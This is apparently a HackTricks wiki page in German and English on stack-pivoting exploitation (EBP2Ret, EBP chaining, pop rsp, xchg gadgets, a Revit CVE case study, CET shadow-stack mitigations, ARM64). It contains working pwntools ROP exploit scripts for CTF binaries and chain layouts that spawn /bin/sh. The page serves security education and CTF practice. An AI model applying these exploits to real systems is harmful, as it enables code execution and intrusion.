# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Diese Technik nutzt die Möglichkeit, den **Base Pointer (EBP/RBP)** zu manipulieren, um durch gezielte Verwendung des frame pointer und der Befehlssequenz **`leave; ret`** die Ausführung mehrerer Funktionen zu verketten.

Zur Erinnerung: auf x86/x86-64 **`leave`** ist äquivalent zu:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```
Und da das gespeicherte **EBP/RBP im stack** vor dem gespeicherten EIP/RIP liegt, ist es möglich, es zu kontrollieren, indem man den Stack kontrolliert.

> Notes
> - On 64-bit, replace EBP→RBP and ESP→RSP. Semantics are the same.
> - Some compilers omit the frame pointer (see “EBP might not be used”). In that case, `leave` might not appear and this technique won’t work.

### EBP2Ret

Diese Technik ist besonders nützlich, wenn du das gespeicherte EBP/RBP **verändern kannst, aber keinen direkten Weg hast, EIP/RIP zu ändern**. Sie nutzt das Verhalten des function epilogue.

Wenn es während der Ausführung von `fvuln` gelingt, ein **gefälschtes EBP** auf dem Stack zu platzieren, das auf einen Speicherbereich zeigt, in dem sich die Adresse deines shellcode/ROP chain befindet (plus 8 Bytes auf amd64 / 4 Bytes auf x86, um das `pop` zu berücksichtigen), kannst du RIP indirekt kontrollieren. Beim Return der Funktion setzt `leave` RSP auf die manipulierte Adresse und das anschließende `pop rbp` verringert RSP, **wodurch es effektiv auf eine vom Angreifer dort abgelegte Adresse zeigt**. `ret` wird dann diese Adresse verwenden.

Beachte, dass du **2 Adressen kennen musst**: die Adresse, auf die ESP/RSP gehen wird, und den Wert, der an dieser Adresse gespeichert ist und von `ret` konsumiert wird.

#### Exploit Construction

Zuerst musst du eine **Adresse kennen, an die du beliebige Daten/Adressen schreiben kannst**. RSP wird hierhin zeigen und den ersten `ret` **verbrauchen**.

Dann musst du die Adresse wählen, die `ret` verwenden soll und die die **Ausführung überträgt**. Du könntest verwenden:

- Eine gültige [**ONE_GADGET**](https://github.com/david942j/one_gadget) Adresse.
- Die Adresse von **`system()`** gefolgt vom passenden Return und Argumenten (auf x86: `ret` target = `&system`, dann 4 Junk-Bytes, dann `&"/bin/sh"`).
- Die Adresse eines **`jmp esp;`** Gadgets ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) gefolgt von Inline-Shellcode.
- Eine [**ROP**](../rop-return-oriented-programing/index.html) chain, die im beschreibbaren Speicher abgelegt ist.

Denke daran, dass vor jeder dieser Adressen im kontrollierten Bereich **Platz für das `pop ebp/rbp`** durch `leave` sein muss (8B auf amd64, 4B auf x86). Du kannst diese Bytes ausnutzen, um ein **zweites gefälschtes EBP** zu setzen und die Kontrolle nach dem ersten Return zu behalten.

#### Off-By-One Exploit

Es gibt eine Variante, die verwendet wird, wenn du **nur das niederwertigste Byte des gespeicherten EBP/RBP** ändern kannst. In diesem Fall muss die Speicherstelle, die die Adresse enthält, auf die mit **`ret`** gesprungen werden soll, die ersten drei/fünf Bytes mit dem ursprünglichen EBP/RBP teilen, damit ein 1-Byte-Überschreiben sie umleiten kann. Üblicherweise wird das low byte (Offset 0x00) erhöht, um so weit wie möglich innerhalb einer nahen Page/aligned-Region zu springen.

Es ist außerdem üblich, einen RET sled im stack zu verwenden und die eigentliche ROP-Chain am Ende zu platzieren, um die Wahrscheinlichkeit zu erhöhen, dass das neue RSP innerhalb des Sleds liegt und die finale ROP-Chain ausgeführt wird.

### EBP Chaining

Indem man eine kontrollierte Adresse in den gespeicherten `EBP`-Slot des Stacks legt und ein `leave; ret` Gadget in `EIP/RIP` hat, ist es möglich, `ESP/RSP` auf eine vom Angreifer kontrollierte Adresse zu **verschieben**.

Jetzt ist `RSP` kontrolliert und die nächste Instruktion ist `ret`. Lege im kontrollierten Speicher etwas wie:

- `&(next fake EBP)` -> Wird von `pop ebp/rbp` aus `leave` geladen.
- `&system()` -> Wird von `ret` aufgerufen.
- `&(leave;ret)` -> Nachdem `system` endet, verschiebt es RSP zum nächsten gefälschten EBP und fährt fort.
- `&("/bin/sh")` -> Argument für `system`.

Auf diese Weise ist es möglich, mehrere gefälschte EBPs zu verketten, um den Programmfluss zu kontrollieren.

Das ist wie ein [ret2lib](../rop-return-oriented-programing/ret2lib/index.html), aber komplexer und nur in Randfällen nützlich.

Außerdem findest du hier ein [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave), das diese Technik mit einem **stack leak** verwendet, um eine winning function aufzurufen. Dies ist die finale Payload von der Seite:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of another fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
buffer,         # Load leaked address in RBP
LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
> amd64 alignment tip: Das System V ABI verlangt eine 16-Byte-Stack-Ausrichtung an Call-Stellen. Wenn deine chain Funktionen wie `system` aufruft, füge vor dem Aufruf ein Alignment-Gadget (z. B. `ret` oder `sub rsp, 8 ; ret`) hinzu, um die Ausrichtung beizubehalten und `movaps`-Crashes zu vermeiden.

## EBP wird möglicherweise nicht verwendet

Wie [**in diesem Beitrag erklärt**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), wenn ein Binary mit bestimmten Optimierungen oder mit Wegfall des Frame-Pointers kompiliert wurde, **kontrolliert EBP/RBP niemals ESP/RSP**. Deshalb wird jeder Exploit, der dadurch funktioniert, dass er EBP/RBP kontrolliert, fehlschlagen, weil Prolog/Epilog nicht vom Frame-Pointer wiederhergestellt wird.

- Nicht optimiert / Frame-Pointer verwendet:
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- Optimiert / Framezeiger weggelassen:
```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```
Auf amd64 sieht man häufig `pop rbp ; ret` anstelle von `leave ; ret`, aber wenn der Frame-Pointer vollständig weggelassen wird, gibt es keinen `rbp`-basierten Epilog, durch den man pivotieren könnte.

## Andere Wege, RSP zu kontrollieren

### `pop rsp` gadget

[**Auf dieser Seite**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) findest du ein Beispiel, das diese Technik verwendet. Für diese Challenge musste eine Funktion mit 2 bestimmten Argumenten aufgerufen werden; es gab ein **`pop rsp` gadget** und einen **leak vom Stack**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg <reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Sieh dir die ret2esp-Technik hier an:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

### Pivot-Gadgets schnell finden

Verwende deinen bevorzugten gadget finder, um nach klassischen pivot primitives zu suchen:

- `leave ; ret` on functions or in libraries
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret` (or `add esp, <imm> ; ret` on x86)

Beispiele:
```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```
### Classic pivot staging pattern

Eine robuste pivot-Strategie, die in vielen CTFs/exploits verwendet wird:

1) Nutze einen kleinen initialen overflow, um `read`/`recv` in einen großen beschreibbaren Bereich (z. B. `.bss`, heap oder gemappten RW-Speicher) aufzurufen und dort eine vollständige ROP chain zu platzieren.  
2) Return in ein pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`), um RSP in diesen Bereich zu bewegen.  
3) Fahre mit der staged chain fort (z. B. leak libc, rufe `mprotect` auf, dann `read` shellcode und springe anschließend dorthin).

### Windows: Destructor-loop weird-machine pivots (Revit RFA case study)

Client-side Parser implementieren manchmal destructor loops, die indirekt einen function pointer aufrufen, der aus attacker-controlled Objekt-Feldern abgeleitet ist. Wenn jede Iteration genau einen indirekten Aufruf bietet (eine “one-gadget” machine), kannst du das in einen zuverlässigen stack pivot und ROP entry umwandeln.

Observed in Autodesk Revit RFA deserialization (CVE-2025-5037):

- Crafted objects of type `AString` place a pointer to attacker bytes at offset 0.  
- The destructor loop effectively executes one gadget per object:
```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```
Zwei praktische Pivots:

- Windows 10 (32-bit heap addrs): misaligned “monster gadget” that contains `8B E0` → `mov esp, eax`, eventually `ret`, to pivot from the call primitive to a heap-based ROP chain.
- Windows 11 (full 64-bit addrs): Verwende zwei Objekte, um einen eingeschränkten weird-machine pivot zu betreiben:
  - Gadget 1: `push rax ; pop rbp ; ret` (move original rax into rbp)
  - Gadget 2: `leave ; ... ; ret` (becomes `mov rsp, rbp ; pop rbp ; ret`), pivoting into the first object’s buffer, where a conventional ROP chain follows.

Tipps für Windows x64 nach dem Pivot:

- Beachte den 0x20-Byte shadow space und halte eine 16-Byte-Ausrichtung vor `call`-Stellen ein. Es ist oft praktisch, Literale über der Rücksprungadresse zu platzieren und ein Gadget wie `lea rcx, [rsp+0x20] ; call rax` gefolgt von `pop rax ; ret` zu verwenden, um Stack-Adressen zu übergeben, ohne den Kontrollfluss zu korrumpieren.
- Nicht-ASLR-Hilfsmodule (falls vorhanden) bieten stabile Gadget-Pools und Imports wie `LoadLibraryW`/`GetProcAddress`, um Ziele wie `ucrtbase!system` dynamisch aufzulösen.
- Erzeugen fehlender Gadgets via einen writable thunk: endet eine vielversprechende Sequenz in einem `call` über einen beschreibbaren Funktionszeiger (z.B. DLL import thunk oder function pointer in .data), überschreibe diesen Zeiger mit einem harmlosen Einzel-Schritt wie `pop rax ; ret`. Die Sequenz verhält sich dann, als würde sie mit `ret` enden (z.B. `mov rdx, rsi ; mov rcx, rdi ; ret`), was unschätzbar ist, um Windows x64-Argumentregister zu laden, ohne andere zu überschreiben.

Für den vollständigen Kettenaufbau und Gadget-Beispiele siehe die Referenz unten.

## Moderne Gegenmaßnahmen, die Stack-Pivoting brechen (CET/Shadow Stack)

Moderne x86-CPUs und OSes setzen zunehmend **CET Shadow Stack (SHSTK)** ein. Mit aktiviertem SHSTK vergleicht `ret` die Rücksprungadresse auf dem normalen Stack mit einem hardware-geschützten Shadow-Stack; jede Abweichung löst einen Control-Protection-Fehler aus und beendet den Prozess. Daher stürzen Techniken wie EBP2Ret/leave;ret-basierte Pivots ab, sobald das erste `ret` vom pivotierten Stack ausgeführt wird.

- For background and deeper details see:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Schnelle Prüfungen auf Linux:
```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```
- Hinweise für Labs/CTF:
- Some modern distros enable SHSTK for CET-enabled binaries when hardware and glibc support is present. For controlled testing in VMs, SHSTK can be disabled system-wide via the kernel boot parameter `nousershstk`, or selectively enabled via glibc tunables during startup (see references). Deaktivieren Sie keine Schutzmaßnahmen auf Produktionszielen.
- JOP/COOP or SROP-based techniques might still be viable on some targets, but SHSTK specifically breaks `ret`-based pivots.

- Windows-Hinweis: Windows 10+ stellt user-mode und Windows 11 fügt kernel-mode “Hardware-enforced Stack Protection” basierend auf shadow stacks hinzu. CET-kompatible Prozesse verhindern stack pivoting/ROP beim `ret`; Entwickler melden sich über CETCOMPAT und verwandte Richtlinien an (siehe Referenz).

## ARM64

In ARM64 speichern und laden der **Prolog und Epilog** der Funktionen das **SP-Register nicht** auf dem Stack. Außerdem springt die **`RET`**-Instruktion nicht zur Adresse, auf die SP zeigt, sondern **zur Adresse in `x30`**.

Daher wird man standardmäßig durch Ausnutzen des Epilogs **nicht in der Lage sein, das SP-Register zu kontrollieren**, indem man einige Daten im Stack überschreibt. Und selbst wenn es gelingt, das SP zu kontrollieren, benötigt man immer noch einen Weg, das **`x30`**-Register zu **kontrollieren**.

- prologue

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```

- epilogue

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> Der Weg, etwas Ähnliches wie stack pivoting auf ARM64 durchzuführen, wäre, das **`SP`** kontrollieren zu können (z. B. indem man ein Register kontrolliert, dessen Wert an `SP` übergeben wird, oder weil `SP` aus dem Stack eine Adresse nimmt und wir einen Overflow haben) und dann den **Epilog** auszunutzen, um das **`x30`**-Register aus einem **kontrollierten `SP`** zu laden und mit **`RET`** dorthin zu springen.

Außerdem findet sich auf der folgenden Seite das Äquivalent von **Ret2esp in ARM64**:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## References

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64 Bit, Off-by-one-Exploitation mit einer rop chain, die mit einem ret sled beginnt
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64 bit, no relro, canary, nx and pie. The program grants a leak for stack or pie and a WWW of a qword. First get the stack leak and use the WWW to go back and get the pie leak. Then use the WWW to create an eternal loop abusing `.fini_array` entries + calling `__libc_csu_fini` ([more info here](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)). Abusing this "eternal" write, it's written a ROP chain in the .bss and end up calling it pivoting with RBP.
- Linux Kernel-Dokumentation: Control-flow Enforcement Technology (CET) Shadow Stack — Details zu SHSTK, `nousershstk`, `/proc/$PID/status` flags und Aktivierung via `arch_prctl`. https://www.kernel.org/doc/html/next/x86/shstk.html
- Microsoft Learn: Kernel Mode Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection
- [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)

{{#include ../../banners/hacktricks-training.md}}
